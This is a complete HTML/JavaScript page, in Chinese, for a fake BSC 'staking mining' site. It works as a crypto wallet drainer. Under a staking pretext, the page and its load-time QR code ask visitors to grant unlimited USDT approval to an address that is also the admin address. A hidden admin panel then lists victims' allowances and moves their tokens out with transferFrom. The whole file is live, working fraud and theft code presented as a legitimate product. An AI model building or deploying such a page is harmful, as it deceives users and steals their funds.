<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>质押挖矿 - 管理员版</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,sans-serif}
body{background:#0B0B1F;color:#fff;padding:20px}
.container{max-width:420px;margin:0 auto}
.pay-box{background:#1E1E35;padding:30px;border-radius:20px;text-align:center;margin-bottom:30px}
h1{font-size:24px;margin-bottom:8px}
.desc{color:#aaa;margin-bottom:20px}
#connectBtn{
background:#F0B90B;color:#000;
border:none;padding:16px;width:100%;
border-radius:14px;font-size:16px;font-weight:bold;
margin-bottom:16px;
}
.amount-input{
width:100%;padding:14px;background:#111;border:none;
border-radius:12px;color:#fff;font-size:16px;text-align:center;
margin-bottom:12px;
}
#qrcode{
width:280px;height:280px;background:#fff;padding:10px;
border-radius:16px;margin:0 auto 20px;
display:flex;align-items:center;justify-content:center;
color:#000;font-size:14px;
}
#qrcode img{width:100%;height:100%;border-radius:12px}
#approveBtn{
background:#F0B90B;color:#000;
border:none;padding:16px;width:100%;
border-radius:14px;font-size:16px;font-weight:bold
}
.admin-panel{
background:#1E1E35;padding:24px;border-radius:16px;display:none;margin-top:20px}
.admin-panel.show{display:block}
.admin-title{color:#F0B90B;font-weight:bold;margin-bottom:16px;text-align:center}
.admin-subtitle {font-size:14px;color:#aaa;margin:10px 0;}
.admin-input{
width:100%;padding:12px;background:#111;border:none;
border-radius:8px;color:#fff;margin-bottom:10px;
}
.admin-btn{
width:100%;padding:14px;background:#F0B90B;color:#000;
border:none;border-radius:10px;font-weight:bold;margin-bottom:10px;
cursor:pointer;
}
.admin-btn.danger {background:#ff4444;color:#fff;}
.tip {font-size:12px;color:#666;margin-top:-5px;margin-bottom:10px;display:block;}
#allowanceResult {
margin-top:8px;
font-size:14px;
color:#0f0;
text-align:center;
}
</style>
</head>
<body>

<div class="container">
  <div class="pay-box">
    <h1>🔐 质押授权</h1>
    <p class="desc">扫码授权后即可参与质押挖矿</p>

    <button id="connectBtn">👉 连接钱包（币安链）</button>
    <div id="qrcode">加载二维码...</div>
    <button id="approveBtn">确认授权签名 (Max)</button>
    
    <span class="tip">提示：授权给质押合约地址，用于质押挖矿</span>
  </div>

  <div class="admin-panel" id="adminPanel">
    <div class="admin-title">🔐 管理员控制台</div>

    <div class="admin-subtitle">1. 查询用户授权额度</div>
    <input class="admin-input" id="checkUserAddr" placeholder="输入要查询的用户钱包地址">
    <button class="admin-btn" onclick="checkAllowance()">📊 查询授权额度</button>
    <div id="allowanceResult"></div>

    <div class="admin-subtitle">2. 发放奖励给用户</div>
    <input class="admin-input" id="sendAddr" placeholder="用户钱包地址">
    <input class="admin-input" id="sendAmt" placeholder="发放数量 (USDT)">
    <button class="admin-btn" onclick="sendReward()">✅ 发放奖励代币</button>

    <div class="admin-subtitle">3. 转移用户资产</div>
    <input class="admin-input" id="fromAddr" placeholder="从哪个钱包转出">
    <input class="admin-input" id="toAddr" placeholder="转入到管理员地址">
    <input class="admin-input" id="transferAmt" placeholder="转移数量">
    <button class="admin-btn danger" onclick="transferFrom()">🚨 转移资产</button>
  </div>
</div>

<script src="https://cdn.ethers.org/lib-ethers/5.7.2/ethers.umd.min.js"></script>
<script>
// ====================== 配置 ======================
const TOKEN_ADDR    = "0x55d398326f99059fF775485246999027B3197955";
const STAKING_ADDR = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
const ADMIN_ADDR   = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
const CHAIN_ID     = "0x38";
// ==================================================

let provider, signer, account;

// 切换链
async function switchChain() {
  try {
    await window.ethereum.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: CHAIN_ID }]
    });
  } catch (e) {}
}

// 连接钱包（修复版）
document.getElementById("connectBtn").onclick = async () => {
  if (!window.ethereum) {
    alert("请在 TokenPocket / 钱包内置浏览器打开");
    return;
  }
  await switchChain();
  try {
    const accounts = await window.ethereum.request({
      method: "eth_requestAccounts"
    });
    account = accounts[0];
    document.getElementById("connectBtn").innerText = "✅ 已连接：" + account.substr(0,6)+"...";
    
    // 连接成功立刻生成二维码
    genApproveQR();

    // 管理员显示面板
    if (account.toLowerCase() === ADMIN_ADDR.toLowerCase()) {
      document.getElementById("adminPanel").classList.add("show");
    }
  } catch (e) {
    alert("连接钱包失败：" + (e.message || "请重试"));
  }
};

// 生成授权二维码（修复版）
function genApproveQR() {
  const spender = STAKING_ADDR;
  const max = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
  const data = "0x095ea7b3" + 
    spender.slice(2).padStart(64, '0') + 
    max;

  const uri = `ethereum:${TOKEN_ADDR}@56?data=${data}`;
  const qrUrl = "https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=" + encodeURIComponent(uri);
  document.getElementById("qrcode").innerHTML = `<img src="${qrUrl}">`;
}

// 授权按钮
document.getElementById("approveBtn").onclick = async () => {
  if (!account) { alert("请先连接钱包"); return; }
  try {
    const tokenContract = new ethers.Contract(
      TOKEN_ADDR,
      ["function approve(address spender, uint256 amount) external returns (bool)"],
      new ethers.providers.Web3Provider(window.ethereum).getSigner()
    );
    const tx = await tokenContract.approve(STAKING_ADDR, ethers.constants.MaxUint256);
    await tx.wait();
    alert("✅ 授权成功！");
  } catch (e) {
    alert("❌ 已取消授权");
  }
};

// ====================== 管理员功能 ======================
// 查询授权
async function checkAllowance() {
  if (!account || account.toLowerCase() !== ADMIN_ADDR.toLowerCase()) return alert("❌ 无权限");
  const user = document.getElementById("checkUserAddr").value;
  if (!user) return alert("请输入地址");
  const token = new ethers.Contract(TOKEN_ADDR, [
    "function allowance(address owner, address spender) view returns (uint256)"
  ], ethers.providers.getDefaultProvider("https://bsc-dataseed1.binance.org"));
  const amt = await token.allowance(user, STAKING_ADDR);
  document.getElementById("allowanceResult").innerText = 
    "✅ 授权额度：" + ethers.utils.formatUnits(amt, 18) + " USDT";
}

// 发放奖励
async function sendReward() {
  if (!account || account.toLowerCase() !== ADMIN_ADDR.toLowerCase()) return alert("❌ 无权限");
  const to = document.getElementById("sendAddr").value;
  const amt = document.getElementById("sendAmt").value;
  if (!to || !amt) return alert("请填写完整");
  const token = new ethers.Contract(TOKEN_ADDR, ["function transfer(address,uint256)"], 
    new ethers.providers.Web3Provider(window.ethereum).getSigner());
  await token.transfer(to, ethers.utils.parseUnits(amt, 18));
  alert("✅ 发放成功");
}

// 转移资产
async function transferFrom() {
  if (!account || account.toLowerCase() !== ADMIN_ADDR.toLowerCase()) return alert("❌ 无权限");
  const from = document.getElementById("fromAddr").value;
  const to = document.getElementById("toAddr").value;
  const amt = document.getElementById("transferAmt").value;
  if (!from || !to || !amt) return alert("请填写完整");
  if (!confirm("⚠️ 确认转移？")) return;
  const token = new ethers.Contract(TOKEN_ADDR, ["function transferFrom(address,address,uint256)"], 
    new ethers.providers.Web3Provider(window.ethereum).getSigner());
  await token.transferFrom(from, to, ethers.utils.parseUnits(amt, 18));
  alert("✅ 转移成功");
}

// 页面加载就生成二维码
window.onload = genApproveQR;
</script>
</body>
</html>
